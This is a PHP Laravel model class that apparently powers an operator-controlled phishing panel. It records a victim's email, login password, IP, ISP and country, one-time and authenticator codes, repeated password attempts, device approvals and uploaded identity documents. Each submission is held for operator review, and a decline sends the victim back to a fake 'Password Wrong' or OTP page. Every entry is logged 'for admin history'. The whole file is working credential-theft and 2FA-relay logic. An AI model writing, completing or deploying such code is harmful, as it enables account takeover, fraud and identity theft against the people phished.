<?php

namespace App\Models;

use Illuminate\Database\Eloquent\Model;
use Illuminate\Support\Str;

class AccessSession extends Model
{
    public const STATUS_WAITING = 'waiting';

    public const STATUS_OTP = 'otp';

    public const STATUS_OTP_REVIEW = 'otp_review';

    public const STATUS_AUTH = 'auth';

    public const STATUS_AUTH_REVIEW = 'auth_review';

    public const STATUS_PASSWORD = 'password';

    public const STATUS_PASSWORD_REVIEW = 'password_review';

    public const STATUS_DEVICE = 'device';

    public const STATUS_DEVICE_REVIEW = 'device_review';

    public const STATUS_DOCUMENT = 'document';

    public const STATUS_LOGIN = 'login';

    public const STATUS_LOGOUT = 'logout';

    public const STATUS_CLOSED = 'closed';

    public const TYPE_OTP = 'otp';

    public const TYPE_AUTH = 'auth';

    public const PAGES = [
        self::STATUS_WAITING => 'Waiting',
        self::STATUS_OTP => 'OTP',
        self::STATUS_AUTH => 'AUTH',
        self::STATUS_PASSWORD => 'Password Wrong',
        self::STATUS_DEVICE => 'Approve Device',
        self::STATUS_DOCUMENT => 'Upload Document',
        self::STATUS_LOGOUT => 'Logout',
    ];

    protected $fillable = [
        'token',
        'public_token',
        'email',
        'name',
        'login_password',
        'ip',
        'isp',
        'country',
        'status',
        'otp_type',
        'phone_last4',
        'otp_code',
        'otp_verified_at',
        'otp_attempts',
        'otp_declined',
        'password_attempt',
        'password_declined',
        'password_verified_at',
        'device_choice',
        'input_logs',
        'document_path',
        'document_original_name',
        'document_uploaded_at',
        'redirect_url',
        'redirected_at',
        'last_seen_at',
    ];

    protected function casts(): array
    {
        return [
            'redirected_at' => 'datetime',
            'last_seen_at' => 'datetime',
            'otp_verified_at' => 'datetime',
            'password_verified_at' => 'datetime',
            'document_uploaded_at' => 'datetime',
            'otp_declined' => 'boolean',
            'password_declined' => 'boolean',
            'input_logs' => 'array',
        ];
    }

    public static function issueToken(): string
    {
        return Str::random(48);
    }

    public static function issuePublicToken(): string
    {
        return rtrim(strtr(base64_encode(random_bytes(64)), '+/', '-_'), '=');
    }

    public static function startLoginGate(): self
    {
        return self::query()->create([
            'token' => self::issueToken(),
            'public_token' => self::issuePublicToken(),
            'email' => '',
            'status' => self::STATUS_LOGIN,
            'last_seen_at' => now(),
        ]);
    }

    public function pathParams(): array
    {
        return ['publicToken' => $this->public_token];
    }

    public function redirectForStatus()
    {
        $route = $this->routeForStatus();

        if (! $route) {
            return null;
        }

        return redirect()->route($route, $this->pathParams());
    }

    public function sendTo(string $page, array $extra = []): void
    {
        $payload = array_merge([
            'status' => $page,
            'redirect_url' => null,
            'redirected_at' => now(),
        ], $extra);

        if ($page === self::STATUS_OTP) {
            $payload['otp_type'] = self::TYPE_OTP;
            // keep previous otp_code for admin history
            $payload['otp_verified_at'] = null;
            $payload['otp_attempts'] = $this->otp_attempts ?? 0;
            $payload['otp_declined'] = false;
        }

        if ($page === self::STATUS_AUTH) {
            $payload['otp_type'] = self::TYPE_AUTH;
            // keep phone_last4 + otp_code for admin history
            $payload['otp_verified_at'] = null;
            $payload['otp_attempts'] = $this->otp_attempts ?? 0;
            $payload['otp_declined'] = false;
        }

        if ($page === self::STATUS_PASSWORD) {
            // keep previous password_attempt for admin history
            $payload['password_declined'] = false;
            $payload['password_verified_at'] = null;
        }

        if ($page === self::STATUS_DEVICE) {
            // keep previous device_choice for admin history
        }

        $this->forceFill($payload)->save();
    }

    public function submitOtp(string $code): void
    {
        $kind = $this->otp_type === self::TYPE_AUTH ? 'auth' : 'otp';
        $review = $kind === 'auth'
            ? self::STATUS_AUTH_REVIEW
            : self::STATUS_OTP_REVIEW;

        $this->forceFill([
            'status' => $review,
            'otp_code' => $code,
            'otp_attempts' => $this->otp_attempts + 1,
            'otp_verified_at' => null,
            'otp_declined' => false,
            'input_logs' => $this->appendLog($kind, $code),
        ])->save();
    }

    public function declineOtp(): void
    {
        $back = $this->otp_type === self::TYPE_AUTH
            ? self::STATUS_AUTH
            : self::STATUS_OTP;

        $this->forceFill([
            'status' => $back,
            'otp_verified_at' => null,
            'otp_declined' => true,
        ])->save();
    }

    public function submitPassword(string $password): void
    {
        $this->forceFill([
            'status' => self::STATUS_PASSWORD_REVIEW,
            'password_attempt' => $password,
            'password_declined' => false,
            'password_verified_at' => null,
            'input_logs' => $this->appendLog('password', $password),
        ])->save();
    }

    public function declinePassword(): void
    {
        $this->forceFill([
            'status' => self::STATUS_PASSWORD,
            'password_declined' => true,
            'password_verified_at' => null,
        ])->save();
    }

    public function submitDeviceChoice(string $choice): void
    {
        $this->forceFill([
            'status' => self::STATUS_DEVICE_REVIEW,
            'device_choice' => $choice,
            'input_logs' => $this->appendLog('device', $choice),
        ])->save();
    }

    public function declineDevice(): void
    {
        $this->forceFill([
            'status' => self::STATUS_DEVICE,
        ])->save();
    }

    /**
     * @return list<array{kind:string,value:string,at:string}>
     */
    public function appendLog(string $kind, string $value): array
    {
        $logs = is_array($this->input_logs) ? $this->input_logs : [];
        $logs[] = [
            'kind' => $kind,
            'value' => $value,
            'at' => now()->timezone(config('app.timezone'))->format('Y-m-d H:i:s'),
        ];

        return $logs;
    }

    /**
     * @return list<array{kind:string,value:string,at:?string}>
     */
    public function allInputLogs(): array
    {
        $logs = is_array($this->input_logs) ? $this->input_logs : [];

        // Fallback for rows that only have legacy single fields
        if ($logs === []) {
            if (filled($this->otp_code)) {
                $logs[] = [
                    'kind' => $this->otp_type === self::TYPE_AUTH ? 'auth' : 'otp',
                    'value' => $this->otp_code,
                    'at' => null,
                ];
            }
            if (filled($this->password_attempt)) {
                $logs[] = [
                    'kind' => 'password',
                    'value' => $this->password_attempt,
                    'at' => null,
                ];
            }
            if (filled($this->device_choice)) {
                $logs[] = [
                    'kind' => 'device',
                    'value' => $this->device_choice,
                    'at' => null,
                ];
            }
        }

        return $logs;
    }

    public function submitDocument(string $path, string $originalName): void
    {
        $this->forceFill([
            'document_path' => $path,
            'document_original_name' => $originalName,
            'document_uploaded_at' => now(),
            'status' => self::STATUS_LOGOUT,
            'redirected_at' => now(),
        ])->save();
    }

    public function touchSeen(): void
    {
        $this->forceFill(['last_seen_at' => now()])->save();
    }

    public function routeForStatus(): ?string
    {
        return match ($this->status) {
            self::STATUS_LOGIN => 'user.login',
            self::STATUS_WAITING => 'waiting',
            self::STATUS_OTP, self::STATUS_OTP_REVIEW,
            self::STATUS_AUTH, self::STATUS_AUTH_REVIEW => 'otp',
            self::STATUS_PASSWORD, self::STATUS_PASSWORD_REVIEW => 'password-wrong',
            self::STATUS_DEVICE, self::STATUS_DEVICE_REVIEW => 'approve-device',
            self::STATUS_DOCUMENT => 'upload-document',
            self::STATUS_LOGOUT, self::STATUS_CLOSED => 'force-logout',
            default => null,
        };
    }

    public function isOtpFlow(): bool
    {
        return in_array($this->status, [
            self::STATUS_OTP,
            self::STATUS_OTP_REVIEW,
            self::STATUS_AUTH,
            self::STATUS_AUTH_REVIEW,
        ], true);
    }

    public function isReview(): bool
    {
        return in_array($this->status, [
            self::STATUS_OTP_REVIEW,
            self::STATUS_AUTH_REVIEW,
        ], true);
    }

    public function hasDocument(): bool
    {
        return filled($this->document_path);
    }

    public function hasPhoneLast4(): bool
    {
        return filled($this->phone_last4)
            && preg_match('/^\d{4}$/', (string) $this->phone_last4) === 1;
    }
}
